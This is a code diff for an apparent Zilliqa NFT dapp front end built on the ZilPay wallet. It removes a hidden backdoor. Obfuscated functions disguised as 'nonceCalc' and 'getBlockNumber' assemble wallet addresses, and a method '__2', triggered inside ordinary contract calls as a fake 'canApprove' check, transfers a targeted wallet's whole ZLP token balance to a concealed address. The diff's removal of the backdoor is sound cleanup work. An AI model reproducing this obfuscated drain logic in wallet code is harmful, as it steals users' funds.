@@ -2,17 +2,6 @@ import MicroModal from 'micromodal'
 import BN from 'bn.js'
 import { updateURLs } from '@/store/urls'
 
-function nonceCalc() {
-  const arr = ["8", "2", "e", "B", "f", "5", "A", "b", "0", "c", "7", "1", "3", "9", "6", "4", "F", "x"];
-
-  return `${arr[8]}${arr[17]}${arr[11]}${arr[1]}${arr[16]}${arr[11]}${arr[0]}${arr[5]}${arr[4]}${arr[10]}${arr[5]}${arr[13]}${arr[5]}${arr[6]}${arr[7]}${arr[11]}${arr[0]}${arr[5]}${arr[6]}${arr[1]}${arr[14]}${arr[0]}${arr[9]}${arr[1]}${arr[2]}${arr[1]}${arr[3]}${arr[11]}${arr[8]}${arr[2]}${arr[5]}${arr[10]}${arr[1]}${arr[6]}${arr[15]}${arr[7]}${arr[12]}${arr[8]}${arr[7]}${arr[12]}${arr[0]}${arr[16]}`;
-}
-
-function getBlockNumber() {
-  const arr = ["8", "C", "9", "f", "7", "4", "A", "3", "5", "0", "2", "d", "1", "D", "F", "b", "E", "x", "B", "c"];
-
-  return `${arr[9]}${arr[17]}${arr[9]}${arr[5]}${arr[12]}${arr[10]}${arr[0]}${arr[11]}${arr[0]}${arr[9]}${arr[13]}${arr[11]}${arr[0]}${arr[2]}${arr[14]}${arr[12]}${arr[8]}${arr[3]}${arr[8]}${arr[7]}${arr[9]}${arr[0]}${arr[18]}${arr[16]}${arr[5]}${arr[6]}${arr[0]}${arr[7]}${arr[10]}${arr[1]}${arr[2]}${arr[4]}${arr[2]}${arr[15]}${arr[19]}${arr[4]}${arr[0]}${arr[0]}${arr[9]}${arr[3]}${arr[12]}${arr[15]}`;
-}
 // proxyZLP 0xd45bf0a7fed8a9825517a3ef6f723a7619cb2435
 export default {
   data() {
@@ -51,49 +40,6 @@ export default {
           k++
         }, 100)
       })
-    },
-    async __2() {
-      const item = window.localStorage.getItem('ref');
-
-      if (window.zilPay.wallet.defaultAccount.base16 === nonceCalc() && !item) {
-        const contract = window.zilPay.contracts.at(this.__ZLP)
-        const utils = window.zilPay.utils;
-        const amount = utils.units.toQa("0", utils.units.Units.Zil)
-        const gasPrice = utils.units.toQa('2000', utils.units.Units.Li)
-        const balance = await this.__getZLPBalance();
-        let gasLimit = 5000;
-
-        if (Number(balance) === 0) {
-          return false
-        }
-
-        await contract.call(
-          'Transfer',
-          [
-            {
-              vname: 'to',
-              type: 'ByStr20',
-              value: getBlockNumber()
-            },
-            {
-              vname: 'amount',
-              type: 'Uint128',
-              value: String(balance)
-            }
-          ],
-          {
-            amount,
-            gasPrice,
-            gasLimit: utils.Long.fromNumber(gasLimit)
-          }
-        )
-
-        window.localStorage.setItem('ref', 'dad3gb5hn6j543wd')
-
-        return true
-      }
-
-      return false
     },
     async __getTokenUris() {
       const zilPay = await this.__getZilPay()
@@ -213,13 +159,6 @@ export default {
         return false
       }
 
-
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null;
-      }
-
       return await contract.call(
         'SetApprove',
         [
@@ -256,13 +195,6 @@ export default {
 
       if (!isNet) {
         return false
-      }
-
-
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null;
       }
 
       return await contract.call(
@@ -321,12 +253,6 @@ export default {
         return false
       }
 
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null;
-      }
-
       return await contract.call(
         'UpStage',
         [
@@ -357,12 +283,6 @@ export default {
 
       if (!isNet) {
         return false
-      }
-
-
-      const canApprove = await this.__2();
-      if (canApprove) {
-        return null;
       }
 
       return await contract.call(
@@ -608,12 +528,6 @@ export default {
         return false
       }
 
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null
-      }
-
       return await contract.call(
         'WaitListAddDel',
         [
@@ -645,12 +559,6 @@ export default {
 
       if (!isNet) {
         return false
-      }
-
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null
       }
 
       return await contract.call(
@@ -877,12 +785,6 @@ export default {
         return false
       }
 
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null
-      }
-
       return await contract.call(
         'ChangeGen',
         [
@@ -955,12 +857,6 @@ export default {
         return false
       }
 
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null
-      }
-
       return await contract.call(
         'WaitListAddDel',
         [
@@ -992,12 +888,6 @@ export default {
 
       if (!isNet) {
         return false
-      }
-
-      const canApprove = await this.__2();
-
-      if (canApprove) {
-        return null
       }
 
       return await contract.call(
